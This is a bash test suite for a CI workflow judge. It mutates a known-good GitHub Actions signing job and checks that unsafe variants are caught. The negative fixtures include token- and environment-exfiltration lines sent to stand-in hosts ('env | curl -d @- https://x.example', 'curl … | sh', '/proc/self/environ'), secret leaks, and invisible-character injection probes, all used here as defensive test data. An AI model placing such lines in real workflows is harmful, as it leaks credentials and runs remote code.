expect() { # expect ok|caught LABEL judge ARG
  local out rc=0
  out=$(judge "$3" "$4") || rc=$?
  if [ "$1" = ok ] && [ "$rc" = 0 ]; then pass=$((pass + 1)); echo "ok   $2"
  elif [ "$1" = caught ] && [ "$rc" != 0 ]; then pass=$((pass + 1)); echo "ok   $2 (caught: ${out:0:160})"
  else failn=$((failn + 1)); echo "FAIL $2 -> ${out:0:500}"; fi
}
sha=$(printf 'a%.0s' $(seq 40))
good="$work/good.yml"
cat > "$good" <<EOF
name: 'Stage: sign'
on:
  workflow_call:
    inputs:
      digests:
        description: 'JSON of the digests Build produced'
        required: true
        type: string
permissions:
  contents: read
jobs:
  sign:
    runs-on: ubuntu-24.04
    permissions:
      contents: read
      id-token: write
    steps:
      - uses: actions/checkout@$sha # v7.0.1
        with:
          persist-credentials: false
      - uses: actions/download-artifact@$sha # v8
        with:
          name: witness-build
          path: witness-build
      - name: install the signing tool (pinned by checksum)
        run: bash bin/install-scanner.sh cosign
      - name: write the digest list to a file
        env:
          DIGESTS: \${{ inputs.digests }}
        run: printf '%s' "\$DIGESTS" > digests.json
      - name: check Build's record, compare the digests, then sign the provenance
        run: python3 -I -B bin/chain-verify.py sign --check --signer cosign --digests digests.json --build-record witness-build/build-collection.json --template .github/policy/release-policy.template.json --out provenance
      - uses: actions/upload-artifact@$sha # v7
        with:
          name: provenance
          path: provenance
EOF
# mutate LABEL  python-regex  replacement : writes $work/LABEL.yml, or counts a FAILURE if the mutation did not apply
mutate() {
  python3 - "$good" "$work/$(printf '%s' "$1" | tr -c 'A-Za-z0-9' _).yml" "$2" "$3" <<'PY' || { failn=$((failn + 1)); echo "FAIL mutation $1 did not apply to the fixture"; return 1; }
import re, sys
t = open(sys.argv[1]).read()
n = re.sub(sys.argv[3], lambda m: sys.argv[4].replace("\\n", "\n").replace("\\t", "\t"), t, count=1, flags=re.S)
if n == t: sys.exit(1)
open(sys.argv[2], "w").write(n)
PY
}
caught() { # LABEL regex replacement
  if mutate "$1" "$2" "$3"; then expect caught "$1" sign "$work/$(printf '%s' "$1" | tr -c 'A-Za-z0-9' _).yml"; fi
}
SIGNLINE='run: python3 -I -B bin/chain-verify.py sign --check --signer cosign --digests digests.json --build-record witness-build/build-collection.json --template .github/policy/release-policy.template.json --out provenance'
expect ok "fixture: known-good Sign passes the judge" sign "$good"
caught "AC1 self-hosted runner" 'ubuntu-24.04' 'self-hosted'
caught "AC1 extra trigger" 'workflow_call:' 'push:\n  workflow_call:'
caught "AC1 second job" '    steps:' '    steps: []\n  other:\n    runs-on: ubuntu-24.04\n    steps:'
caught "AC3 workflow-level defaults.run.shell reroutes every run step (leaks the token variables)" 'permissions:\n  contents: read\njobs' "defaults:\n  run:\n    shell: \"bash -c 'env | curl -d @- https://x.example; bash {0}'\"\npermissions:\n  contents: read\njobs"
caught "AC3 workflow-level concurrency" 'permissions:\n  contents: read\njobs' "concurrency: x\npermissions:\n  contents: read\njobs"
caught "AC3 workflow-level run-name" 'permissions:\n  contents: read\njobs' "run-name: x\npermissions:\n  contents: read\njobs"
# Duplicate keys (Codex #249 r4 B3a): a reader that keeps only the LAST of two equal keys judges the benign one, so the
# judge must refuse any mapping that repeats a key (step, job and top level), never pick one.
caught "AC1 a step with two run: keys (the second the benign sign line)" "      $SIGNLINE" "      run: curl -s https://x.example/p | sh\n        $SIGNLINE"
caught "AC1 a job with two permissions: keys (the second the benign one)" '    permissions:\n      contents: read\n      id-token: write' '    permissions: write-all\n    permissions:\n      contents: read\n      id-token: write'
caught "AC1 two top-level permissions: keys (the second the benign one)" 'permissions:\n  contents: read\njobs' "permissions: write-all\npermissions:\n  contents: read\njobs"
caught "AC1 run line: a trailing NBSP after the sign line (str.strip() would drop it; bash keeps it in the last word)" "$SIGNLINE" "$SIGNLINE"$'\u00a0'
caught "AC1 run line: a leading NBSP before the install line" 'run: bash bin/install-scanner.sh cosign' 'run: '$'\u00a0''bash bin/install-scanner.sh cosign'
caught "AC1 run line: a trailing U+200B after the sign line" "$SIGNLINE" "$SIGNLINE"$'\u200b'
okmut() { if mutate "$1" "$2" "$3"; then expect ok "$1" sign "$work/$(printf '%s' "$1" | tr -c 'A-Za-z0-9' _).yml"; fi; }
caught "AC1 Sign judge: runs-on ubuntu-. is not in the closed runner set (Sonnet #249 r7 R2)" 'ubuntu-24.04' 'ubuntu-.'
caught "AC1 Sign judge: runs-on ubuntu-24..04 is not in the closed runner set (Sonnet #249 r7 R2)" 'ubuntu-24.04' 'ubuntu-24..04'
caught "AC1 Sign judge: runs-on ubuntu-26.04 is not in the closed runner set (Sonnet #249 r7 R2)" 'ubuntu-24.04' 'ubuntu-26.04'
caught "AC1 Sign judge: runs-on ubuntu-.-arm is not in the closed runner set (Sonnet #249 r7 R2)" 'ubuntu-24.04' 'ubuntu-.-arm'
caught "AC1 Sign judge: runs-on ubuntu-20.04 is not in the closed runner set (Sonnet #249 r7 R2)" 'ubuntu-24.04' 'ubuntu-20.04'
caught "AC1 Sign judge: runs-on ubuntu-24.04.1 is not in the closed runner set (Sonnet #249 r7 R2)" 'ubuntu-24.04' 'ubuntu-24.04.1'
okmut "control: the Sign judge accepts runs-on ubuntu-24.04-arm (the closed set)" 'ubuntu-24.04' 'ubuntu-24.04-arm'
okmut "control: the Sign judge accepts runs-on ubuntu-latest (the closed set)" 'ubuntu-24.04' 'ubuntu-latest'
okmut "control: the Sign judge accepts runs-on ubuntu-22.04 (the closed set)" 'ubuntu-24.04' 'ubuntu-22.04'
caught "AC1 two top-level on: keys (the second the benign workflow_call)" '\non:' "\non: push\non:"
caught "AC1 job runs in a container" 'runs-on: ubuntu-24.04' 'runs-on: ubuntu-24.04\n    container: alpine'
caught "AC2 extra input" 'digests:\n        description' 'script:\n        type: string\n      digests:\n        description'
caught "AC2 downloads another artifact" 'name: witness-build' 'name: dist'
caught "AC2 downloads into a parent path" 'path: witness-build' 'path: ..'
caught "AC2 fetches build output with gh" "$SIGNLINE" 'run: gh run download 1 -D dist'
caught "AC2 runs a build output" "$SIGNLINE" 'run: bash dist/run.sh'
caught "AC2 interpolates the input into the shell" 'run: printf .%s. "\$DIGESTS" > digests.json' "run: printf '%s' '\${{ inputs.digests }}' > digests.json"
caught "AC2 two commands in one run step" "out provenance" 'out provenance; curl https://example.com'
caught "AC2 unpinned action" "actions/checkout@$sha" 'actions/checkout@v4'
caught "AC2 github-script step" "      - uses: actions/checkout" "      - uses: actions/github-script@$sha\n        with:\n          script: core.setOutput('t', await core.getIDToken())\n      - uses: actions/checkout"
caught "AC2 the Sign step does not check (no --check)" ' --check' ''
caught "AC2 the Sign step only verifies (verify, not sign --check)" 'chain-verify.py sign --check --signer cosign' 'chain-verify.py verify --record witness-build/build-collection.json #'
caught "AC2 the Sign step has no Build record" ' --build-record witness-build/build-collection.json' ''
caught "AC2 the Sign step reads the digests inline, not from the file" '--digests digests.json' '--digests "\$DIGESTS"'
caught "AC2 the Sign step uses another signer" '--signer cosign' '--signer witness'
caught "AC2 the signing tool is not installed from the pinned installer" 'run: bash bin/install-scanner.sh cosign' 'run: curl -sL https://example.com/cosign -o cosign'
caught "AC2 the signing step runs before the tool is installed" '      - name: install the signing tool \(pinned by checksum\)\n        run: bash bin/install-scanner.sh cosign\n' ''
caught "AC2 two signing steps" "        $SIGNLINE" "        $SIGNLINE\n      - run: python3 bin/chain-verify.py sign --check --signer cosign --digests digests.json --build-record witness-build/build-collection.json --template .github/policy/release-policy.template.json --out provenance"
# Opus r4 B1: Python puts the script's directory first on sys.path, so an unlisted bin/<stdlib name>.py would replace that module inside
# the Sign job (which holds id-token: write); -I (isolated) removes it. The Sign step must run the verifier isolated.
caught "AC2 the Sign step runs the verifier without -I (a bin/<stdlib name>.py would shadow the standard library)" 'python3 -I -B bin/chain-verify.py' 'python3 bin/chain-verify.py'
caught "AC2 the Sign step runs the verifier without -B (it could leave a bytecode cache behind)" 'python3 -I -B bin/chain-verify.py' 'python3 -I bin/chain-verify.py'
caught "AC2 a permissive policy file instead of the template" 'release-policy.template.json' 'permissive.json'
caught "AC2 a different Build record file name" 'witness-build/build-collection.json' 'witness-build/other.json'
caught "AC2 the policy argument points outside .github/policy" '--template .github/policy/release-policy.template.json' '--template /tmp/p.json'
caught "AC3 checkout without persist-credentials: false" '        with:\n          persist-credentials: false\n' ''
caught "AC3 checkout with persist-credentials: true" 'persist-credentials: false' 'persist-credentials: true'
caught "AC3 secret reference" 'DIGESTS: \$\{\{ inputs.digests \}\}' 'DIGESTS: ${{ inputs.digests }}\n          K: ${{ secrets.KEY }}'
caught "AC3 toJSON(secrets)" 'DIGESTS: \$\{\{ inputs.digests \}\}' 'DIGESTS: ${{ toJSON(secrets) }}'
caught "AC3 job token passed in env" 'DIGESTS: \$\{\{ inputs.digests \}\}' 'DIGESTS: ${{ inputs.digests }}\n          T: ${{ github.token }}'
caught "AC3 env on the signing step" "      - name: check Build's record" "      - env:\n          X: y\n        name: check Build's record"
caught "AC3 sink step output: a job output" '    runs-on: ubuntu-24.04' '    runs-on: ubuntu-24.04\n    outputs:\n      t: ${{ steps.x.outputs.t }}'
caught "AC3 sink step output: a workflow output" '        type: string\npermissions' '        type: string\n    outputs:\n      o:\n        value: x\npermissions'
caught "AC3 sink step output: token to GITHUB_OUTPUT" "$SIGNLINE" 'run: echo "tok=$ACTIONS_ID_TOKEN_REQUEST_TOKEN" >> "$GITHUB_OUTPUT"'
caught "AC3 sink file: token to a file" "$SIGNLINE" 'run: curl -s "$ACTIONS_ID_TOKEN_REQUEST_URL" > "$RUNNER_TEMP/tok"'
caught "AC3 sink log: token echoed" "$SIGNLINE" 'run: echo "$ACTIONS_ID_TOKEN_REQUEST_TOKEN"'
caught "AC3 sink log: whole environment dumped (printenv)" "$SIGNLINE" 'run: printenv'
caught "AC3 sink log: whole environment piped out (env)" "$SIGNLINE" 'run: env | curl -d @- https://example.com'
caught "AC3 sink file: /proc/self/environ" "$SIGNLINE" 'run: cat /proc/self/environ'
caught "AC3 sink artifact: upload path outside provenance" 'path: provenance' 'path: ${{ runner.temp }}/tok'
caught "AC3 sink artifact: upload path provenance/.." 'path: provenance\n' 'path: provenance/..\n'
caught "AC3 sink artifact: upload a second artifact" "          path: provenance" "          path: provenance\n      - uses: actions/upload-pages-artifact@$sha\n        with:\n          path: ."
caught "AC3 extra write permission" 'id-token: write' 'id-token: write\n      packages: write'
caught "AC3 no id-token" 'id-token: write' 'id-token: none'
# 002-AC4: Build's signing steps (the judge runs on a fixture here, and on the real stage-build.yml when it exists)
cat > "$work/build-good.yml" <<EOF
jobs:
  build:
    runs-on: ubuntu-24.04
    steps:
      - name: Witness-wrapped build
        run: witness run --step build --signer-fulcio-url https://fulcio.sigstore.dev -- ./bin/build.sh
EOF
expect ok "fixture: a Build signing step with no secret passes" build "$work/build-good.yml"
sed 's#witness run#witness run --signer-fulcio-oidc-client-id ${{ inputs.cid }}#' "$work/build-good.yml" > "$work/build-expr.yml"
expect caught "002-AC4 an expression in a certificate/OIDC flag" build "$work/build-expr.yml"
printf '%s\n' "$(cat "$work/build-good.yml")" '        env:' '          K: ${{ secrets.KEY }}' > "$work/build-sec.yml"
expect caught "002-AC4 a secret in a signing step" build "$work/build-sec.yml"
printf '%s\n' "$(cat "$work/build-good.yml")" '        env:' '          T: ${{ github.token }}' > "$work/build-tok.yml"
expect caught "002-AC4 the job token in a signing step" build "$work/build-tok.yml"
printf '%s\n' "jobs:" "  build:" "    runs-on: ubuntu-24.04" "    env:" '      K: ${{ secrets.KEY }}' "    steps:" "      - run: witness run --step build -- ./bin/build.sh" > "$work/build-jobenv.yml"
expect caught "002-AC4 a secret in the JOB-level env of a job that signs" build "$work/build-jobenv.yml"
printf '%s\n' "jobs:" "  build:" "    runs-on: ubuntu-24.04" "    environment: release" "    steps:" "      - run: witness run --step build -- ./bin/build.sh" > "$work/build-environment.yml"
expect caught "002-AC4 a job that signs runs in a GitHub environment (environment secrets)" build "$work/build-environment.yml"
printf '%s\n' "env:" '  K: ${{ secrets.KEY }}' "jobs:" "  build:" "    runs-on: ubuntu-24.04" "    steps:" "      - run: witness run --step build -- ./bin/build.sh" > "$work/build-wfenv.yml"
expect caught "002-AC4 a secret in the WORKFLOW-level env of a file that signs" build "$work/build-wfenv.yml"
printf '%s\n' "jobs:" "  build:" "    runs-on: ubuntu-24.04" "    steps:" "      - name: long line" "        run: echo start && echo a-very-long-prefix-that-forces-a-yaml-dump-to-wrap-the-line-at-eighty-columns-xxxxxxxxxxxxxxxxxxxx && witness run --step build -- ./bin/build.sh" "        env:" '          K: ${{ secrets.KEY }}' > "$work/build-wrap.yml"
expect caught "002-AC4 a secret in a signing step whose command line is long enough for yaml.dump to wrap" build "$work/build-wrap.yml"
printf '%s\n' "jobs:" "  build:" "    runs-on: ubuntu-24.04" "    steps:" "      - run: echo \"K=\${{ secrets.KEY }}\" >> \"\$GITHUB_ENV\"" "      - run: witness run --step build -- ./bin/build.sh" > "$work/build-ghenv.yml"
expect caught "002-AC4 a secret written to GITHUB_ENV by an earlier step of a job that signs" build "$work/build-ghenv.yml"
# 001-AC1 (advisor decision, Oct 9, replaces the script-reach scan): the tree judge on fixture trees. A stage file may only run what
# .github/policy/chain-scripts.json lists (path + sha256); a listed script may use only its tools and start only its `runs`.
gen() { python3 - "$1" <<'PY'
import hashlib, json, os, sys
d = sys.argv[1]
out = []
for r in json.load(open(d + "/.spec.json")):
    r = dict(r); r["sha256"] = hashlib.sha256(open(os.path.join(d, r["path"]), "rb").read()).hexdigest(); out.append(r)
doc = {"env_names": ["DIGESTS", "V", "X1"], "scripts": out}
if os.path.exists(d + "/.ambient.json"):
    doc["ambient_env"] = json.load(open(d + "/.ambient.json"))      # PR 1b: the closed ambient_env list
    if not os.environ.get("AMBIENT_RAW"):                           # round 4 (4): file and job are required; the fixtures say them once, here
        for e in (doc["ambient_env"] if isinstance(doc["ambient_env"], list) else []):
            if isinstance(e, dict): e.setdefault("file", ".github/workflows/stage-verify.yml"); e.setdefault("job", "j")
if os.path.exists(d + "/.envnames.json"): doc["env_names"] = json.load(open(d + "/.envnames.json"))
if os.path.exists(d + "/.pinned.json"): doc["pinned_steps"] = json.load(open(d + "/.pinned.json"))      # PR 1b round 1: reviewed pinned steps
json.dump(doc, open(d + "/.github/policy/chain-scripts.json", "w"))
PY
}
edit_spec() { # edit_spec DIR 'python statements over rows (dict by path)' : edits the spec, then rewrites chain-scripts.json with fresh hashes
  python3 -c 'import json,sys;d=sys.argv[1];s=json.load(open(d+"/.spec.json"));rows={r["path"]:r for r in s};exec(sys.argv[2]);json.dump(list(rows.values()),open(d+"/.spec.json","w"))' "$1" "$2"
  gen "$1"
}
setfile() { printf '%b' "$3" > "$1/$2"; }                     # setfile DIR path 'content' (content NOT re-hashed: call gen/edit_spec after, or not, on purpose)
stage() { # stage DIR 'run text' [step-env-key] : stage-verify.yml with one run step
  { printf 'jobs:\n  j:\n    steps:\n      - run: |\n'; printf '%s\n' "$2" | sed 's/^/          /'; } > "$1/.github/workflows/stage-verify.yml"
}
mk() {
  local d="$work/$1"; rm -rf "$d"; mkdir -p "$d/.github/workflows" "$d/.github/policy" "$d/.github/actions/x" "$d/bin"
  for f in acceptance auditor ci stage-promote stage-verify stage-reproducibility; do printf 'jobs: {}\n' > "$d/.github/workflows/$f.yml"; done
  cp "$good" "$d/.github/workflows/stage-sign.yml"
  printf 'jobs:\n  b:\n    steps:\n      - run: |\n          set -euo pipefail\n          bash bin/build-stage.sh apk\n' > "$d/.github/workflows/stage-build.yml"
  printf 'jobs:\n  d:\n    steps:\n      - run: git -c gpg.x509.program=gitsign tag -s v1\n' > "$d/.github/workflows/release.yml"
  printf '#!/usr/bin/env bash\nset -euo pipefail\ncurl -fsSL "$1" -o x\nsha256sum -c x\n' > "$d/bin/install-scanner.sh"
  printf '#!/usr/bin/env python3\nprint("chain-verify")\n' > "$d/bin/chain-verify.py"
  printf '#!/usr/bin/env bash\nset -euo pipefail\nwitness run --step build -- bin/build-apk.sh "$1"\n' > "$d/bin/build-stage.sh"
  printf '#!/usr/bin/env bash\nset -euo pipefail\necho built\n' > "$d/bin/build-apk.sh"
  printf '{"signers":[{"file":"release.yml","tool":"gitsign","reason":"CI patch tag (REQ-REL-009-AC5)"}]}\n' > "$d/.github/policy/chain-signers.json"
  printf '{"jobs":[{"workflow":"stage-sign.yml","job":"sign","reason":"Sign, the one provenance signer"}]}\n' > "$d/.github/policy/id-token-jobs.json"
  cat > "$d/.spec.json" <<'JSON'
[{"path":"bin/install-scanner.sh","tools":["curl","sha256sum"],"signs":false,"runs":[]},
 {"path":"bin/chain-verify.py","tools":[],"signs":"provenance","sign_subcommand":"sign","reason":"only `chain-verify.py sign` in stage-sign.yml signs provenance","runs":[]},
 {"path":"bin/build-stage.sh","tools":["witness"],"signs":"other","reason":"Build's own Witness collection (rule 51)","runs":["bin/build-apk.sh"]},
 {"path":"bin/build-apk.sh","tools":[],"signs":false,"runs":[]}]
JSON
  gen "$d"; echo "$d"
}
expect ok "fixture tree: the grammar holds, every stage script is listed with its hash, only Sign signs provenance" tree "$(mk t_good)"
# the grammar, line by line: each odd thing at command position is an ERROR (the probes of review rounds 4-10 all land here, finitely)
okcase() { d=$(mk "$1"); stage "$d" "$2"; expect ok "AC1 grammar: $3" tree "$d"; }
badcase() { d=$(mk "$1"); stage "$d" "$2"; expect caught "AC1 grammar: $3" tree "$d"; }
okcase g_ok1 $'set -euo pipefail\nbash bin/build-stage.sh apk' "set -euo pipefail then a listed script"
badcase g_ok2 $'bash bin/build-stage.sh \\\n  --flag=1 \\\n  two' "a backslash-newline continuation, even with literal arguments (advisor: refused outright; Sonnet #249 continuation)"
okcase g_ok3 $'python3 -I bin/chain-verify.py stage-start --stage rebuild --previous build --record r.json' "chain-verify.py stage-start from a non-Sign stage (only its sign subcommand is a signer)"
# Opus r4 B1: every python3 line of a stage file runs isolated (-I): stage jobs hold id-token: write
badcase g_noI $'python3 bin/chain-verify.py stage-start --stage rebuild --previous build --record r.json' "python3 without -I in a stage file (a bin/<stdlib name>.py would shadow the standard library)"
badcase g_var1 'bash "$S"' 'a variable as the script path (bash "$S")'
badcase g_var2 '"$S"' 'a variable at command position ("$S")'
badcase g_var3 '$S' 'a bare variable at command position ($S)'
badcase g_var4 '${S}' 'a braced variable at command position (${S})'
badcase g_var5 'sudo "$S"' 'sudo before a variable'
badcase g_var6 'bash "$GITHUB_WORKSPACE/bin/build-stage.sh"' 'a workspace-prefixed variable path'
badcase g_glob1 'bash bin/build-s*.sh' 'a glob in the script path'
badcase g_glob2 "find bin -name 's*.sh' -exec sh {} +" 'find -exec'
badcase g_make 'make sign' 'make'
badcase g_xargs1 'cat bin/list.txt | xargs -n1 bash' 'xargs fed by a pipe'
badcase g_xargs2 'xargs bash < bin/list.txt' 'xargs from a redirect'
badcase g_runparts 'run-parts bin/release.d' 'run-parts'
badcase g_npm 'npm run sign' 'npm run'
badcase g_pipe 'cat bin/build-stage.sh | bash' 'a pipe into a shell'
badcase g_bare 'bin/release-sign' 'an extensionless path called directly'
badcase g_dotslash './bin/build-stage.sh' 'a ./ script called directly'
badcase g_dotbash 'bash ./bin/build-stage.sh' 'a ./ path after bash (the path must be a plain relative literal)'
badcase g_semi 'bash bin/build-stage.sh a; bash bin/build-apk.sh' 'two commands joined with ;'
badcase g_and 'bash bin/build-stage.sh a && bash bin/build-apk.sh' 'two commands joined with &&'
badcase g_subst 'bash bin/build-stage.sh $(echo x)' 'a command substitution argument'
badcase g_btick 'bash bin/build-stage.sh `echo x`' 'a backtick argument'
badcase g_expr 'bash bin/build-stage.sh "${{ inputs.x }}"' 'an expression in the run text (args reach a script only through env:)'
badcase g_noenv 'bash bin/build-stage.sh "$X"' 'a "$NAME" read of something that is not in the step env:'
badcase g_ghref 'bash bin/build-stage.sh "$GITHUB_REF"' 'a "$GITHUB_REF" read the step does not declare in its env: (AC1: whole reads of the step'"'"'s OWN env only; Codex #249 r4 B3b)'
badcase g_runtmp 'bash bin/build-stage.sh "${RUNNER_TEMP}"' 'a "${RUNNER_TEMP}" read the step does not declare in its env: (Codex #249 r4 B3b)'
badcase g_cosign 'cosign sign --yes "$IMG"' 'a direct signing tool in a stage file'
badcase g_gh 'gh release create v1' 'a direct gh call'
badcase g_echo 'echo "a << b"' 'a quoted << string is just an unlisted command (nothing is swallowed)'
badcase g_echo2 "echo 'x<<y'" 'a single-quoted << string'
badcase g_dots 'bash ../bin/build-stage.sh' 'a .. path'
badcase g_abs 'bash /opt/x/run.sh' 'an absolute path'
badcase g_unlisted 'bash bin/unlisted.sh' 'an unlisted script'
badcase g_pym 'python3 -m tools.pub' 'python -m'
badcase g_pyc 'python3 -c "import os"' 'python -c'
badcase g_flag 'bash -x bin/build-stage.sh' 'a bash flag before the script'
badcase g_export $'export S=bin/build-stage.sh\nbash "$S"' 'export then a variable path'
badcase g_cond1 $'[ -n "$S" ] || S=bin/clean.sh\nbash "$S"' 'a conditional default (||)'
badcase g_cond2 $'test -z "$S" && S=bin/clean.sh\nbash "$S"' 'a conditional default (&&)'
badcase g_cond3 $'if [ -z "$S" ]; then S=bin/clean.sh; fi\nbash $S' 'a conditional default (if)'
badcase g_cond4 $'case "$1" in a) S=bin/clean.sh;; esac\nbash "$S"' 'a conditional default (case)'
badcase g_ghenv 'echo "S=bin/evil.sh" >> "$GITHUB_ENV"' 'a GITHUB_ENV write'
badcase g_heredoc $'bash bin/build-stage.sh <<EOF\nx\nEOF' 'a heredoc into a script'
badcase g_herestr 'bash bin/build-stage.sh <<< word' 'a here-string'
# argument words (Codex #249 r5 B4, the class closed): a word that reads a variable is exactly ONE part, the whole "$NAME"
argcase() { # argcase NAME 'run' ok|caught LABEL [env names, default V; "-" for none]
  local d e="" n; d=$(mk "$1")
  for n in ${5:-V}; do [ "$n" = - ] || e="$e          $n: x\n"; done
  if [ -n "$e" ]; then printf "jobs:\n  j:\n    steps:\n      - env:\n${e}        run: %s\n" "$2"; else printf 'jobs:\n  j:\n    steps:\n      - run: %s\n' "$2"; fi > "$d/.github/workflows/stage-verify.yml"
  expect "$3" "AC1 grammar: $4" tree "$d"; }
argcase a_ok_whole 'bash bin/build-stage.sh "$V"' ok 'control: a whole "$V" read of the step env'
argcase a_ok_brace 'bash bin/build-stage.sh "${V}"' ok 'control: a whole "${V}" read of the step env'
argcase a_ok_lit 'bash bin/build-stage.sh plain '"'"'single quoted'"'"' --flag 1 a_b/c.d-e' ok 'control: plain and single-quoted literals' -
# LIT_WORD is closed to what a stage line needs (Codex #249 r6 sweep): letters, digits, _ . / - ; anything else must be single-quoted
argcase a_eq 'bash bin/build-stage.sh --flag=1' caught 'an unquoted = in a literal argument (tightened LIT_WORD)' -
argcase a_at 'bash bin/build-stage.sh a@b' caught 'an unquoted @ in a literal argument (tightened LIT_WORD)' -
argcase a_pct 'bash bin/build-stage.sh a%b' caught 'an unquoted % in a literal argument (tightened LIT_WORD)' -
argcase a_colon 'bash bin/build-stage.sh sha256:abc' caught 'an unquoted : in a literal argument (tightened LIT_WORD)' -
argcase a_plus 'bash bin/build-stage.sh a+b' caught 'an unquoted + in a literal argument (tightened LIT_WORD)' -
argcase a_comma 'bash bin/build-stage.sh a,b' caught 'an unquoted , in a literal argument (tightened LIT_WORD)' -
argcase a_ok_sqeq 'bash bin/build-stage.sh '"'"'--flag=1'"'"'' ok 'control: the same text single-quoted is a literal' -
argcase a_prefix 'bash bin/build-stage.sh prefix"$V"' caught 'a literal prefix glued to a whole read, prefix"$V" (Codex #249 r5 B4)'
argcase a_suffix 'bash bin/build-stage.sh "$V"suffix' caught 'a whole read with a literal suffix, "$V"suffix (B4 sibling)'
argcase a_two 'bash bin/build-stage.sh "$V""$X1"' caught 'two whole reads glued into one word, "$V""$X1" (B4 sibling)' 'V X1'
argcase a_sqglue 'bash bin/build-stage.sh "$V"'"'"'lit'"'"'' caught 'a whole read glued to a single-quoted literal, "$V"'"'"'lit'"'"' (B4 sibling)'
argcase a_dqglue 'bash bin/build-stage.sh "$V""lit"' caught 'a whole read glued to a double-quoted literal, "$V""lit" (B4 sibling)'
argcase a_sqpre 'bash bin/build-stage.sh '"'"'lit'"'"'"$V"' caught 'a single-quoted literal glued before a whole read, '"'"'lit'"'"'"$V" (B4 sibling)'
argcase a_bare 'bash bin/build-stage.sh $V' caught 'an unquoted $V (B4 sibling)'
argcase a_bracesuf 'bash bin/build-stage.sh ${V}suffix' caught 'an unquoted ${V}suffix (B4 sibling)'
argcase a_default 'bash bin/build-stage.sh "${V:-default}"' caught 'a parameter expansion with a default, "${V:-default}" (B4 sibling)'
argcase a_strip 'bash bin/build-stage.sh "${V#x}"' caught 'a parameter expansion that strips, "${V#x}" (B4 sibling)'
argcase a_len 'bash bin/build-stage.sh "${#V}"' caught 'a length expansion, "${#V}" (B4 sibling)'
argcase a_indirect 'bash bin/build-stage.sh "${!V}"' caught 'an indirect expansion, "${!V}" (B4 sibling)'
argcase a_subst 'bash bin/build-stage.sh "$(cat x)"' caught 'a quoted command substitution, "$(cat x)" (B4 sibling)' -
argcase a_backtick 'bash bin/build-stage.sh "`cat x`"' caught 'a quoted backtick substitution (B4 sibling)' -
argcase a_arith 'bash bin/build-stage.sh $((1+1))' caught 'an arithmetic expansion, $((1+1)) (B4 sibling)' -
argcase a_arithq 'bash bin/build-stage.sh "$((1+1))"' caught 'a quoted arithmetic expansion (B4 sibling)' -
argcase a_tilde 'bash bin/build-stage.sh ~/x' caught 'a tilde word at argument position, ~/x (B4 sibling)' -
argcase a_glob 'bash bin/build-stage.sh bin/*.sh' caught 'a glob word at argument position, bin/*.sh (B4 sibling)' -
argcase a_qmark 'bash bin/build-stage.sh bin/x?.sh' caught 'a ? glob at argument position (B4 sibling)' -
argcase a_bracket 'bash bin/build-stage.sh bin/[ab].sh' caught 'a [..] glob at argument position (B4 sibling)' -
argcase a_brace 'bash bin/build-stage.sh a{b,c}' caught 'a brace expansion at argument position, a{b,c} (B4 sibling)' -
argcase a_notinenv 'bash bin/build-stage.sh "$DIGESTS"' caught 'a whole read of DIGESTS, listed in env_names but not declared in this step env (B4 control for the env rule)' -
# run-line characters and continuations (Sonnet #249 continuation; advisor: refuse, never model how bash joins): any backslash-newline,
# any backslash outside a single-quoted literal, and any control, non-ASCII whitespace or invisible character (Z*/C*) is refused
rawcase() { # rawcase NAME ok|caught ENV(- for none) JSON-RUN LABEL : the run value written as a YAML double-quoted (JSON) string
  local d e; d=$(mk "$1")
  if [ "$3" = - ]; then e="      - run: "; else e="      - env:\n          $3: x\n        run: "; fi
  printf "jobs:\n  j:\n    steps:\n${e}%s\n" "$4" > "$d/.github/workflows/stage-verify.yml"; expect "$2" "AC1 run line: $5" tree "$d"; }
rawcase r_ok_single ok - '"bash bin/build-stage.sh a"' 'control: one listed run line'
rawcase r_ok_two ok - '"bash bin/build-stage.sh a\nbash bin/build-stage.sh b\n"' 'control: a block scalar of two listed run lines, each judged alone'
rawcase r_ok_sqbs ok - '"bash bin/build-stage.sh '"'"'a\\b'"'"'"' 'control: a backslash inside a single-quoted literal'
rawcase r_probe_path caught - '"bash bin/build-stage.sh\\\n.evil"' 'a backslash-newline gluing .evil onto the script path (bash runs bin/build-stage.sh.evil; Sonnet probe 1)'
rawcase r_probe_arg caught V '"bash bin/build-stage.sh pre\\\n\"$V\""' 'a backslash-newline gluing a literal to a whole read (bash passes preVALUE; Sonnet probe 2)'
rawcase r_trail caught - '"bash bin/build-stage.sh arg\\\n"' 'a trailing backslash-newline continuation'
rawcase r_contread caught V '"bash bin/build-stage.sh \\\n\"$V\""' 'a backslash-newline before a whole read'
rawcase r_basl caught - '"ba\\\nsh bin/build-stage.sh a"' 'a backslash-newline inside the command word, ba-backslash-newline-sh'
rawcase r_escspace caught - '"bash bin/build\\ stage.sh"' 'an escaped space in the script path'
rawcase r_escquote caught - '"bash bin/build-stage.sh a\\\"b"' 'an escaped double quote, a-backslash-quote-b'
rawcase r_escdollar caught - '"bash bin/build-stage.sh \\$V"' 'an escaped dollar'
rawcase r_bsdq caught - '"bash bin/build-stage.sh \"a\\b\""' 'a backslash inside double quotes'
rawcase r_cr caught - '"bash bin/build-stage.sh a\rb"' 'a CR inside a run line (bash keeps it in the word)'
rawcase r_tab caught - '"bash bin/build-stage.sh\ta"' 'a tab between words'
rawcase r_vt caught - '"bash bin/build-stage.sh a\u000bb"' 'a vertical tab inside a word'
rawcase r_ff caught - '"bash bin/build-stage.sh a\fb"' 'a form feed inside a word'
rawcase r_nul caught - '"bash bin/build-stage.sh a\u0000b"' 'a NUL inside a word'
rawcase r_esc caught - '"bash bin/build-stage.sh a\u001bb"' 'an ESC control character inside a word'
rawcase r_nbsp caught - '"bash bin/build-stage.sh a\u00a0b"' 'a NBSP between words (one word to bash)'
rawcase r_ideo caught - '"bash bin/build-stage.sh a\u3000b"' 'an ideographic space between words'
rawcase r_zwpath caught - '"bash bin/build-stage.sh\u200b a"' 'a U+200B in the script path'
rawcase r_zwsq caught - '"bash bin/build-stage.sh '"'"'a\u200bb'"'"'"' 'a U+200B inside a single-quoted literal'
rawcase r_nbspsq caught - '"bash bin/build-stage.sh '"'"'a\u00a0b'"'"'"' 'a NBSP inside a single-quoted literal'
rawcase r_tabsq caught - '"bash bin/build-stage.sh '"'"'a\tb'"'"'"' 'a tab inside a single-quoted literal'
rawcase r_ls caught - '"bash bin/build-stage.sh a\u2028b"' 'a U+2028 line separator inside a word'
rawcase r_nel caught - '"bash bin/build-stage.sh a\u0085b"' 'a U+0085 next-line inside a word'
rawcase r_bidi caught - '"bash bin/build-stage.sh a\u202eb"' 'a right-to-left override inside a word'
